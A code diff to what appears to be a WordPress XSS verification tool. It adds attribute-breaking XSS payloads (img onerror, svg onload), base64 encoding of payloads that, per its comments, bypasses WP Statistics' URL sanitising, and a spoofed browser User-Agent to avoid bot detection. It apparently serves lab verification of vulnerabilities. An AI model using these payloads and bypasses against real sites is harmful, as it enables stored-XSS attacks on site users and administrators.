@@ -4080,6 +4080,7 @@ def verify_wordpress_xss(
     shortcode_name: Optional[str] = None,
     keep_lab_on_failure: bool = False,
     stored_xss_view_path: str = "",
+    payload_transform: str = "",
 ) -> WpVerifyResult:
     """Verifica XSS en dos modos:
 
@@ -4160,6 +4161,11 @@ def verify_wordpress_xss(
             # rotura de atributo HTML (el payload cae DENTRO de value="..."/placeholder="..." etc.)
             f"\"><script>{js}</script>",
             f"'><script>{js}</script>",
+            # rotura de href="..." (el URI almacenado se inyecta en el atributo href de un <a>)
+            # -- necesita romper con " y ejecutar via onerror/onload, NO via <script> (innerHTML)
+            f"\"><img src=x onerror=\"{js}\">",
+            f"\"><svg onload=\"{js}\">",
+            f"'><img src=x onerror=\"{js}\">",
             f"\" onmouseover=\"{js}\" x=\"",
             f"' onmouseover='{js}' x='",
             f"\" autofocus onfocus=\"{js}\" x=\"",
@@ -4199,15 +4205,31 @@ def verify_wordpress_xss(
                  f"'{stored_xss_view_path}'...")
             step(f"arrancando Chromium headless (modo stored-XSS, {len(attempts)} payloads)...")
             with _XssBrowserSession() as xb:
+                import base64 as _base64
                 for payload_value in attempts:
                     params_inject = dict(base_params)
-                    params_inject[xss_param] = payload_value
-                    # PASO 1: subscriber inyecta (peticion HTTP, sin render)
+                    # Aplicar transformacion de payload si el endpoint lo requiere
+                    # (ej: WP Statistics espera page_uri base64-encoded para bypass de sanitize_url)
+                    _effective_payload = payload_value
+                    if payload_transform == "base64":
+                        _effective_payload = _base64.b64encode(
+                            payload_value.encode()).decode()
+                    params_inject[xss_param] = _effective_payload
+                    # PASO 1: subscriber inyecta (peticion HTTP, sin render).
+                    # Si el endpoint es REST API (/wp-json/...) usamos User-Agent de navegador real
+                    # para evitar que el plugin identifique la peticion como bot y la ignore.
+                    _inject_headers = {}
+                    if "/wp-json/" in endpoint:
+                        _inject_headers = {"User-Agent": (
+                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                            "AppleWebKit/537.36 (KHTML, like Gecko) "
+                            "Chrome/120.0.0.0 Safari/537.36")}
                     try:
                         boot.sub_sess.request(
                             m, boot.base_url + endpoint, timeout=20,
                             data=params_inject if m != "GET" else None,
-                            params=params_inject if m == "GET" else None)
+                            params=params_inject if m == "GET" else None,
+                            headers=_inject_headers if _inject_headers else None)
                     except Exception as e:
                         tried.append({"payload": payload_value, "paso1_error": str(e)})
                         continue
